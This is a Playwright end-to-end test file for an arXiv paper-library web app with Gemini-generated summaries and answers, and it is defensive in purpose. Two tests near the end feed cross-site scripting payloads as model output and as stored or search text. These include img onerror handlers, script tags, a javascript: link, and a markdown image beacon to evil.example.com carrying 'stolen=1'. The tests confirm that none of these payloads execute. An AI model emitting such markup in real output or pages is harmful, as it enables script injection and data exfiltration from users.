"""End-to-end browser testing: real Chrome, real JavaScript and CSS, and the real app over real HTTP.

Everything else in this suite stops at the HTML the server sends. These tests are the only ones that
run htmx, the page's own scripts, and the CSS. The outside services are still fakes, so they run
offline. They need Google Chrome, or `playwright install chromium`, and skip if neither is available.
"""

from __future__ import annotations

import socket
import threading
import time
from urllib.parse import urlsplit

import httpx
import pytest

pytest.importorskip("playwright.sync_api")

import uvicorn  # noqa: E402
from playwright.sync_api import Error as PlaywrightError  # noqa: E402
from playwright.sync_api import expect, sync_playwright  # noqa: E402

from app import db  # noqa: E402
from app.main import app  # noqa: E402
from helpers import BODY_FACT, PAPER_TITLE, atom_entry, atom_feed, make_pdf, recorded, stored_pdfs  # noqa: E402

pytestmark = pytest.mark.browser

SUMMARY = "**TL;DR:** Agents write useful tests.\n\n### Problem\nTesting is slow."
LONG_ABSTRACT = "This sentence makes the abstract long enough to collapse on the page. " * 30


def candidate_reply(text: str) -> httpx.Response:
    candidate = {"content": {"role": "model", "parts": [{"text": text}]}, "finishReason": "STOP"}
    return httpx.Response(200, json={"candidates": [candidate]})


def slowly(response: httpx.Response, seconds: float = 0.6):
    """A fake reply that takes long enough for the page to show its in-progress state."""

    def handler(_request: httpx.Request) -> httpx.Response:
        time.sleep(seconds)
        return response

    return handler


@pytest.fixture(scope="module")
def live_server():
    """The real app on a real port, in this process, so it sees each test's fakes and temp library."""
    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    sock.listen()
    port = sock.getsockname()[1]
    server = uvicorn.Server(uvicorn.Config(app, lifespan="off", log_level="critical", access_log=False))
    thread = threading.Thread(target=server.run, kwargs={"sockets": [sock]}, daemon=True)
    thread.start()
    deadline = time.time() + 15
    while not server.started and time.time() < deadline:
        time.sleep(0.02)
    assert server.started
    yield f"http://127.0.0.1:{port}"
    server.should_exit = True
    thread.join(timeout=10)


@pytest.fixture(scope="module")
def browser():
    with sync_playwright() as playwright:
        try:
            instance = playwright.chromium.launch(channel="chrome")
        except PlaywrightError:
            try:
                instance = playwright.chromium.launch()
            except PlaywrightError as exc:
                pytest.skip(f"No browser available. Install Google Chrome or run `playwright install chromium`. ({exc})")
        yield instance
        instance.close()


@pytest.fixture
def open_page(browser, live_server):
    """Make pages, and after the test check that nothing on them threw or called another site."""
    contexts = []
    javascript_errors: list[str] = []
    outside_requests: list[str] = []

    def make(**options):
        context = browser.new_context(base_url=live_server, **options)
        contexts.append(context)
        page = context.new_page()
        page.on("pageerror", lambda error: javascript_errors.append(str(error)))

        def note_request(request) -> None:
            if urlsplit(request.url).scheme in ("http", "https") and not request.url.startswith(live_server):
                outside_requests.append(request.url)

        page.on("request", note_request)
        return page

    yield make
    for context in contexts:
        context.close()
    assert javascript_errors == []
    assert outside_requests == []


@pytest.fixture
def page(open_page):
    return open_page(viewport={"width": 1280, "height": 900}, color_scheme="light")


# --- Search ----------------------------------------------------------------------------------


def search(page, query: str) -> None:
    page.fill("input[name=q]", query)
    page.press("input[name=q]", "Enter")


def test_searching_shows_results_without_reloading_the_page(page, arxiv):
    arxiv.reply(200, text=atom_feed(atom_entry("2401.00001", title="Graph Testing")))
    page.goto("/")
    expect(page.locator("input[name=q]")).to_be_focused()
    page.evaluate("window.stillTheSamePage = true")

    search(page, "graph testing")

    expect(page.locator(".entry-title")).to_have_text("Graph Testing")
    assert page.evaluate("window.stillTheSamePage") is True
    assert "q=graph" in page.url


def test_an_empty_search_is_not_sent(page):
    page.goto("/")
    page.click(".search-form button")
    page.wait_for_timeout(200)  # the fake arXiv would fail this test if a request were made
    assert page.evaluate("document.querySelector('input[name=q]').validity.valueMissing") is True
    expect(page.locator(".entry")).to_have_count(0)


def test_the_progress_message_shows_while_searching_and_the_button_is_disabled(page, arxiv):
    arxiv.reply_with(slowly(httpx.Response(200, text=recorded("arxiv_no_results.xml"))))
    page.goto("/")
    expect(page.locator("#search-working")).to_be_hidden()

    search(page, "testing")

    expect(page.locator("#search-working")).to_be_visible()
    expect(page.locator(".search-form button")).to_be_disabled()
    expect(page.locator(".empty-state")).to_be_visible()
    expect(page.locator("#search-working")).to_be_hidden()
    expect(page.locator(".search-form button")).to_be_enabled()


def test_changing_the_sort_reruns_the_search_without_a_reload(page, arxiv, scholar):
    arxiv.reply(200, text=atom_feed(atom_entry(published="2026-03-05T10:00:00Z")))
    scholar.reply(200, json=[{"citationCount": 1234}])
    page.goto("/?q=testing")
    page.evaluate("window.stillTheSamePage = true")

    page.select_option("select[name=sort]", "recent")
    expect(page.locator(".facts")).to_have_text("Submitted 5 Mar 2026")
    assert "sort=recent" in page.url

    page.select_option("select[name=sort]", "citations")
    expect(page.locator(".facts")).to_have_text("1,234 citations")
    assert "sort=citations" in page.url
    assert page.evaluate("window.stillTheSamePage") is True


def by_query_and_sort(request: httpx.Request) -> httpx.Response:
    query = request.url.params["search_query"].removeprefix("all:")
    label = request.url.params["sortBy"]
    return httpx.Response(200, text=atom_feed(atom_entry(title=f"{query} by {label}")))


def test_back_and_forward_keep_the_sort_menu_with_its_results(page, arxiv):
    arxiv.reply_with(by_query_and_sort)
    page.goto("/?q=testing")
    expect(page.locator(".entry-title")).to_have_text("testing by relevance")
    page.select_option("select[name=sort]", "recent")
    expect(page.locator(".entry-title")).to_have_text("testing by submittedDate")

    page.go_back()
    expect(page.locator(".entry-title")).to_have_text("testing by relevance")
    expect(page.locator("select[name=sort]")).to_have_value("relevance")

    page.go_forward()
    expect(page.locator(".entry-title")).to_have_text("testing by submittedDate")
    expect(page.locator("select[name=sort]")).to_have_value("recent")


def test_back_keeps_the_search_box_with_its_results(page, arxiv):
    arxiv.reply_with(by_query_and_sort)
    page.goto("/")
    for query in ("first", "second", "third"):
        search(page, query)
        expect(page.locator(".entry-title")).to_have_text(f"{query} by relevance")

    page.go_back()
    expect(page.locator(".entry-title")).to_have_text("second by relevance")
    expect(page.locator("input[name=q]")).to_have_value("second")


def test_going_back_to_the_empty_search_page_clears_the_form(page, arxiv):
    arxiv.reply_with(by_query_and_sort)
    page.goto("/")
    search(page, "testing")
    expect(page.locator(".entry-title")).to_have_text("testing by relevance")
    page.select_option("select[name=sort]", "recent")
    expect(page.locator(".entry-title")).to_have_text("testing by submittedDate")

    page.go_back()
    page.go_back()

    expect(page.locator(".entry")).to_have_count(0)
    expect(page.locator("input[name=q]")).to_have_value("")
    expect(page.locator("select[name=sort]")).to_have_value("relevance")


def test_special_characters_in_a_query_survive_going_back(page, arxiv):
    arxiv.reply_with(by_query_and_sort)
    typed = 'graph & "neural" = 100% / nets?'
    page.goto("/")
    search(page, typed)
    expect(page.locator(".entry")).to_have_count(1)
    search(page, "second")
    expect(page.locator(".entry-title")).to_have_text("second by relevance")
    page.go_back()
    expect(page.locator(".entry")).to_have_count(1)
    expect(page.locator("input[name=q]")).to_have_value(typed)


def test_an_unknown_sort_in_the_url_shows_as_arxiv_rank(page, arxiv):
    arxiv.reply_with(by_query_and_sort)
    page.goto("/?q=testing&sort=bogus")
    expect(page.locator("select[name=sort]")).to_have_value("relevance")
    search(page, "second")
    expect(page.locator(".entry-title")).to_have_text("second by relevance")
    page.go_back()
    expect(page.locator(".entry-title")).to_have_text("testing by relevance")
    expect(page.locator("select[name=sort]")).to_have_value("relevance")


def test_reloading_a_search_url_shows_the_same_search(page, arxiv):
    arxiv.reply_with(by_query_and_sort)
    page.goto("/?q=testing&sort=recent")
    expect(page.locator(".entry-title")).to_have_text("testing by submittedDate")
    page.reload()
    expect(page.locator(".entry-title")).to_have_text("testing by submittedDate")
    expect(page.locator("select[name=sort]")).to_have_value("recent")
    expect(page.locator("input[name=q]")).to_have_value("testing")
    assert page.evaluate("document.activeElement.name") != "q"


def test_a_failed_search_shows_its_error_in_the_page(page, arxiv):
    arxiv.reply(429)
    page.goto("/")
    search(page, "testing")
    alert = page.get_by_role("alert")
    expect(alert).to_contain_text("arXiv is busy")


def test_show_full_abstract_expands_and_collapses(page, arxiv):
    arxiv.reply(200, text=atom_feed(atom_entry(abstract=LONG_ABSTRACT)))
    page.goto("/?q=testing")
    abstract = page.locator(".abstract")
    button = page.locator(".link-button")
    is_cut_off = "element => element.scrollHeight > element.clientHeight"

    assert abstract.evaluate(is_cut_off) is True
    expect(button).to_have_text("Show full abstract")
    expect(button).to_have_attribute("aria-expanded", "false")

    button.click()
    assert abstract.evaluate(is_cut_off) is False
    expect(button).to_have_text("Show less")
    expect(button).to_have_attribute("aria-expanded", "true")

    button.click()
    assert abstract.evaluate(is_cut_off) is True
    expect(button).to_have_text("Show full abstract")
    expect(button).to_have_attribute("aria-expanded", "false")


def test_each_show_full_abstract_button_controls_its_own_result(page, arxiv):
    arxiv.reply(200, text=atom_feed(atom_entry("2401.00001", abstract=LONG_ABSTRACT), atom_entry("2401.00002", abstract=LONG_ABSTRACT)))
    page.goto("/?q=testing")
    is_cut_off = "element => element.scrollHeight > element.clientHeight"
    page.locator(".link-button").nth(1).click()
    assert page.locator(".abstract").nth(0).evaluate(is_cut_off) is True
    assert page.locator(".abstract").nth(1).evaluate(is_cut_off) is False


# --- Saving ------------------------------------------------------------------------------------


def test_saving_swaps_the_button_and_updates_the_count_without_a_reload(page, arxiv, arxiv_pdfs):
    arxiv.reply(200, text=atom_feed(atom_entry("2401.12345", title=PAPER_TITLE)))
    arxiv_pdfs.reply_with(slowly(httpx.Response(200, content=make_pdf())))
    page.goto("/?q=testing")
    expect(page.locator("#library-count")).to_have_text("0")
    expect(page.locator(".busy-label")).to_be_hidden()

    save = page.locator(".save-slot button")
    save.click()

    expect(page.locator(".busy-label")).to_be_visible()
    expect(save).to_be_disabled()
    expect(page.locator(".saved-note")).to_have_text("In your library")
    expect(page.locator(".save-slot")).to_have_count(1)  # replaced, not nested inside the old one
    expect(page.locator("#library-count")).to_have_text("1")

    page.click(".save-slot a")
    expect(page.locator("h1")).to_have_text(PAPER_TITLE)
    assert db.count_papers() == 1


def test_a_failed_save_shows_why_and_can_be_retried(page, arxiv, arxiv_pdfs):
    arxiv.reply(200, text=atom_feed(atom_entry("2401.12345")))
    arxiv_pdfs.reply(503).reply(200, content=make_pdf())
    page.goto("/?q=testing")

    page.click(".save-slot button")
    expect(page.locator(".inline-error")).to_contain_text("HTTP 503")
    expect(page.locator("#library-count")).to_have_text("0")

    page.click(".save-slot button")
    expect(page.locator(".saved-note")).to_be_visible()
    expect(page.locator(".inline-error")).to_have_count(0)
    expect(page.locator("#library-count")).to_have_text("1")


# --- The library -----------------------------------------------------------------------------------


def test_deleting_asks_first_then_removes_the_row_and_updates_the_count(page, add_paper):
    add_paper(arxiv_id="2401.00001", title="First Paper")
    add_paper(arxiv_id="2401.00002", title="Second Paper")
    page.goto("/library")
    rows = page.locator(".library-entries .entry")
    expect(rows).to_have_count(2)
    expect(page.locator(".empty-note")).to_be_hidden()

    messages: list[str] = []

    def dismiss(dialog) -> None:
        messages.append(dialog.message)
        dialog.dismiss()

    page.once("dialog", dismiss)
    rows.nth(0).locator("button").click()
    page.wait_for_timeout(150)
    assert "Second Paper" in messages[0]
    expect(rows).to_have_count(2)
    assert db.count_papers() == 2

    page.on("dialog", lambda dialog: dialog.accept())
    rows.nth(0).locator("button").click()
    expect(rows).to_have_count(1)
    expect(page.locator("#library-count")).to_have_text("1")
    expect(rows.nth(0)).to_contain_text("First Paper")

    rows.nth(0).locator("button").click()
    expect(rows).to_have_count(0)
    expect(page.locator("#library-count")).to_have_text("0")
    expect(page.locator(".empty-note")).to_be_visible()
    assert stored_pdfs() == []


def upload(page, data: bytes, name: str = "paper.pdf") -> None:
    page.set_input_files("input[type=file]", files=[{"name": name, "mimeType": "application/pdf", "buffer": data}])
    page.click(".upload-form button")


def test_uploading_goes_to_the_new_papers_page(page, gemini):
    gemini.reply_with(slowly(candidate_reply('{"title": "Gemini Title", "authors": ["Carol White"], "year": 2022, "abstract": "An abstract."}')))
    page.goto("/library")
    expect(page.locator("#upload-working")).to_be_hidden()

    upload(page, make_pdf())

    expect(page.locator("#upload-working")).to_be_visible()
    page.wait_for_url("**/papers/*")
    expect(page.locator("h1")).to_have_text("Gemini Title")
    expect(page.locator(".paper-head .authors")).to_have_text("Carol White")
    expect(page.locator(".alert-info")).to_have_count(0)


def test_uploading_without_a_key_says_the_details_may_be_incomplete(page):
    page.goto("/library")
    upload(page, make_pdf())
    page.wait_for_url("**/papers/*")
    expect(page.locator("h1")).to_have_text(PAPER_TITLE)
    expect(page.locator(".alert-info")).to_contain_text("may be incomplete")
    expect(page.locator(".alert-warn")).to_contain_text("GEMINI_API_KEY")


def test_a_rejected_upload_shows_why_and_stays_on_the_page(page):
    page.goto("/library")
    upload(page, b"this is not a pdf", "notes.pdf")
    expect(page.locator("#upload-status .alert-error")).to_contain_text("isn't a PDF")
    assert page.url.endswith("/library")
    assert db.count_papers() == 0
    expect(page.locator(".upload-form button")).to_be_enabled()


# --- One paper --------------------------------------------------------------------------------------


def test_summarizing_replaces_the_button_with_the_summary(page, gemini, add_paper):
    gemini.reply_with(slowly(candidate_reply(SUMMARY)))
    paper_id = add_paper()
    page.goto(f"/papers/{paper_id}")
    expect(page.locator("#summary-working")).to_be_hidden()

    button = page.get_by_role("button", name="Summarize paper")
    button.click()

    expect(page.locator("#summary-working")).to_be_visible()
    expect(button).to_be_disabled()
    expect(page.locator(".summary h3")).to_have_text("Problem")
    expect(page.locator(".summary strong")).to_have_text("TL;DR:")
    expect(page.get_by_role("button", name="Regenerate")).to_be_visible()
    expect(page.get_by_role("button", name="Summarize paper")).to_have_count(0)
    assert BODY_FACT in gemini.prompt()


def test_a_failed_summary_shows_why_and_can_be_retried(page, gemini, add_paper):
    gemini.reply_error(429, "Quota exhausted.", "RESOURCE_EXHAUSTED").reply_text(SUMMARY)
    page.goto(f"/papers/{add_paper()}")

    page.get_by_role("button", name="Summarize paper").click()
    expect(page.locator("#summary-panel .alert-error")).to_contain_text("quota")

    page.get_by_role("button", name="Summarize paper").click()
    expect(page.locator(".summary h3")).to_have_text("Problem")
    expect(page.locator("#summary-panel .alert-error")).to_have_count(0)


def test_regenerating_replaces_the_summary(page, gemini, add_paper):
    paper_id = add_paper()
    db.set_summary(paper_id, "Old summary.")
    gemini.reply_text("New summary.")
    page.goto(f"/papers/{paper_id}")
    expect(page.locator(".summary")).to_have_text("Old summary.")
    page.get_by_role("button", name="Regenerate").click()
    expect(page.locator(".summary")).to_have_text("New summary.")


def test_a_suggested_question_is_asked_and_its_answer_appended(page, gemini, add_paper):
    gemini.reply_with(slowly(candidate_reply("The **Zephyr** benchmark.")))
    paper_id = add_paper()
    page.goto(f"/papers/{paper_id}")
    expect(page.locator(".empty-note")).to_be_visible()
    expect(page.locator("#qa-working")).to_be_hidden()

    chip = page.get_by_role("button", name="What datasets are used?")
    chip.click()

    expect(page.locator("#qa-working")).to_be_visible()
    expect(chip).to_be_disabled()
    expect(page.locator(".qa-item")).to_have_count(1)
    expect(page.locator(".qa-item .question")).to_have_text("What datasets are used?")
    expect(page.locator(".qa-item strong")).to_have_text("Zephyr")
    expect(page.locator(".empty-note")).to_be_hidden()
    expect(chip).to_be_enabled()


def test_a_typed_question_clears_the_box_and_answers_pile_up_in_order(page, gemini, add_paper):
    gemini.reply_text("First answer.").reply_text("Second answer.")
    page.goto(f"/papers/{add_paper()}")
    box = page.locator(".ask-form input")

    box.fill("First question?")
    box.press("Enter")
    expect(page.locator(".qa-item")).to_have_count(1)
    expect(box).to_have_value("")

    box.fill("Second question?")
    page.click(".ask-form button")
    expect(page.locator("#qa-list .qa-item")).to_have_count(2)
    expect(page.locator("#qa-list .qa-item .question")).to_have_text(["First question?", "Second question?"])
    expect(box).to_have_value("")


def test_a_failed_question_keeps_what_you_typed_and_a_retry_clears_the_error(page, gemini, add_paper):
    gemini.reply_error(429, "Quota exhausted.", "RESOURCE_EXHAUSTED").reply_text("The answer.")
    page.goto(f"/papers/{add_paper()}")
    box = page.locator(".ask-form input")

    box.fill("My long question?")
    box.press("Enter")
    expect(page.locator("#qa-error .alert-error")).to_contain_text("quota")
    expect(box).to_have_value("My long question?")
    expect(page.locator(".qa-item")).to_have_count(0)
    expect(box).to_be_enabled()

    box.press("Enter")
    expect(page.locator(".qa-item")).to_have_count(1)
    expect(page.locator("#qa-error .alert-error")).to_have_count(0)
    expect(box).to_have_value("")


def test_the_open_pdf_link_serves_the_pdf(page, add_paper):
    paper_id = add_paper()
    page.goto(f"/papers/{paper_id}")
    link = page.get_by_role("link", name="Open PDF")
    expect(link).to_have_attribute("target", "_blank")
    response = page.request.get(link.get_attribute("href"))
    assert response.status == 200
    assert response.headers["content-type"] == "application/pdf"
    assert response.body().startswith(b"%PDF")


# --- Nothing runs that shouldn't -----------------------------------------------------------------------


def test_attacks_in_model_output_do_nothing_in_a_real_browser(page, gemini, add_paper):
    gemini.reply_text(
        '<img src=x onerror="window.pwned=1">\n\n<script>window.pwned=1</script>\n\n'
        "![leak](https://evil.example.com/pixel.png?stolen=1)\n\n[click](javascript:window.pwned=1)"
    )
    paper_id = add_paper()
    page.goto(f"/papers/{paper_id}")
    page.get_by_role("button", name="Summarize paper").click()
    expect(page.locator(".summary")).to_be_visible()
    page.wait_for_timeout(200)
    assert page.evaluate("window.pwned") is None
    assert page.locator(".summary img").count() == 0
    assert page.locator(".summary script").count() == 0
    # The open_page fixture also fails this test if the page called evil.example.com.


def test_attacks_in_search_and_stored_text_do_nothing_in_a_real_browser(page, arxiv, add_paper):
    attack = '<img src=x onerror="window.pwned=1">"><script>window.pwned=1</script>'
    arxiv.reply(200, text=atom_feed(atom_entry(title=f"A {attack}", authors=[attack], abstract=attack)))
    add_paper(title=f"B {attack}", authors=[attack], abstract=attack)

    page.goto("/")
    search(page, attack)
    expect(page.locator(".entry-title")).to_contain_text("A <img")
    page.goto("/library")
    expect(page.locator(".entry-title")).to_contain_text("B <img")

    assert page.evaluate("window.pwned") is None


# --- Layout and themes ------------------------------------------------------------------------------------


@pytest.mark.parametrize("path", ["/?q=testing", "/library", "/papers/{id}"], ids=["search", "library", "paper"])
def test_nothing_scrolls_sideways_on_a_phone(open_page, arxiv, add_paper, path):
    arxiv.reply(200, text=atom_feed(atom_entry(abstract=LONG_ABSTRACT, title="A very long title " * 8)))
    paper_id = add_paper(title="A very long title " * 8, abstract=LONG_ABSTRACT)
    phone = open_page(viewport={"width": 390, "height": 844}, is_mobile=True, has_touch=True, device_scale_factor=2)
    phone.goto(path.format(id=paper_id))
    assert phone.evaluate("document.documentElement.scrollWidth - document.documentElement.clientWidth") <= 0


def test_on_a_phone_the_search_box_gets_its_own_row(open_page, arxiv):
    phone = open_page(viewport={"width": 390, "height": 844}, is_mobile=True, has_touch=True)
    phone.goto("/")
    box = phone.locator("input[name=q]").bounding_box()
    menu = phone.locator("select[name=sort]").bounding_box()
    button = phone.locator(".search-form button").bounding_box()
    assert menu["y"] > box["y"] + box["height"] - 1
    assert abs(menu["y"] - button["y"]) < 5


def test_on_a_phone_a_result_stacks_its_year_above_its_title(open_page, arxiv):
    arxiv.reply(200, text=atom_feed(atom_entry()))
    phone = open_page(viewport={"width": 390, "height": 844}, is_mobile=True, has_touch=True)
    phone.goto("/?q=testing")
    year = phone.locator(".entry-margin").bounding_box()
    title = phone.locator(".entry-title").bounding_box()
    assert year["y"] + year["height"] <= title["y"] + 1


@pytest.mark.parametrize(("scheme", "background"), [("light", "rgb(248, 248, 245)"), ("dark", "rgb(20, 24, 29)")])
def test_the_page_follows_the_light_or_dark_setting(open_page, scheme, background):
    themed = open_page(color_scheme=scheme)
    themed.goto("/")
    assert themed.evaluate("getComputedStyle(document.body).backgroundColor") == background


# --- Screen readers: the names a browser works out from the markup ------------------------------


def test_the_search_page_is_labelled_for_screen_readers(page):
    page.goto("/")
    expect(page.get_by_role("navigation", name="Main")).to_be_visible()
    expect(page.get_by_role("searchbox", name="Search arXiv")).to_be_visible()
    expect(page.get_by_role("combobox", name="Sort results")).to_be_visible()


def test_the_library_is_labelled_for_screen_readers(page, add_paper):
    add_paper()
    page.goto("/library")
    expect(page.get_by_role("region", name="Add a PDF")).to_be_visible()
    expect(page.get_by_role("region", name="Saved papers")).to_be_visible()
    expect(page.get_by_label("PDF file")).to_be_visible()
    expect(page.get_by_role("button", name=f"Delete {PAPER_TITLE}")).to_be_visible()


def test_the_paper_page_is_labelled_for_screen_readers(page, add_paper):
    page.goto(f"/papers/{add_paper()}")
    for name in ("Abstract", "Summary", "Questions"):
        expect(page.get_by_role("region", name=name, exact=True)).to_be_visible()
    expect(page.get_by_role("group", name="Suggested questions")).to_be_visible()
    expect(page.get_by_role("textbox", name="Your question")).to_be_visible()


# --- Without JavaScript -------------------------------------------------------------------------


def test_searching_works_without_javascript(open_page, arxiv):
    arxiv.reply(200, text=atom_feed(atom_entry(title="Found without JavaScript")))
    page = open_page(java_script_enabled=False)
    page.goto("/")
    search(page, "testing")
    expect(page.locator(".entry-title")).to_have_text("Found without JavaScript")
    assert "q=testing" in page.url


def test_uploading_works_without_javascript(open_page):
    page = open_page(java_script_enabled=False)
    page.goto("/library")
    upload(page, make_pdf())
    expect(page.locator("h1")).to_have_text(PAPER_TITLE)
    assert db.count_papers() == 1


# --- What the page does while it waits, and what it won't send ------------------------------------


def test_an_empty_upload_is_not_sent(page):
    page.goto("/library")
    page.click(".upload-form button")
    page.wait_for_timeout(200)  # an alert would arrive if the request were made
    assert page.evaluate("document.querySelector('input[type=file]').validity.valueMissing") is True
    expect(page.locator("#upload-status")).to_be_empty()


def test_an_empty_question_is_not_sent(page, add_paper):
    page.goto(f"/papers/{add_paper()}")
    page.click(".ask-form button")
    page.wait_for_timeout(200)  # an alert would arrive if the request were made
    assert page.evaluate("document.querySelector('input[name=question]').validity.valueMissing") is True
    expect(page.locator("#qa-error")).to_be_empty()


def test_the_upload_button_is_disabled_while_the_file_is_read(page, gemini):
    gemini.reply_with(slowly(candidate_reply('{"title": "Gemini Title", "authors": [], "year": 2024, "abstract": ""}')))
    page.goto("/library")
    upload(page, make_pdf())
    expect(page.locator(".upload-form button")).to_be_disabled()
    page.wait_for_url("**/papers/*")


def test_asking_a_typed_question_shows_progress_and_disables_the_form(page, gemini, add_paper):
    gemini.reply_with(slowly(candidate_reply("An answer.")))
    page.goto(f"/papers/{add_paper()}")
    box = page.locator(".ask-form input")
    expect(page.locator("#qa-working")).to_be_hidden()

    box.fill("Why?")
    box.press("Enter")

    expect(page.locator("#qa-working")).to_be_visible()
    expect(box).to_be_disabled()
    expect(page.locator("#qa-list .qa-item")).to_have_count(1)
    expect(page.locator("#qa-working")).to_be_hidden()
    expect(box).to_be_enabled()


def test_a_suggested_question_adds_to_the_earlier_answers(page, gemini, add_paper):
    gemini.reply_text("First answer.").reply_text("Second answer.")
    page.goto(f"/papers/{add_paper()}")
    page.get_by_role("button", name="What datasets are used?").click()
    expect(page.locator("#qa-list .qa-item")).to_have_count(1)
    page.get_by_role("button", name="What are the major limitations?").click()
    expect(page.locator("#qa-list .qa-item .question")).to_have_text(["What datasets are used?", "What are the major limitations?"])


def test_regenerating_shows_progress_and_disables_the_button(page, gemini, add_paper):
    paper_id = add_paper()
    db.set_summary(paper_id, "Old summary.")
    gemini.reply_with(slowly(candidate_reply("New summary.")))
    page.goto(f"/papers/{paper_id}")
    button = page.get_by_role("button", name="Regenerate")
    expect(page.locator("#summary-working")).to_be_hidden()

    button.click()

    expect(page.locator("#summary-working")).to_be_visible()
    expect(button).to_be_disabled()
    expect(page.locator(".summary")).to_have_text("New summary.")
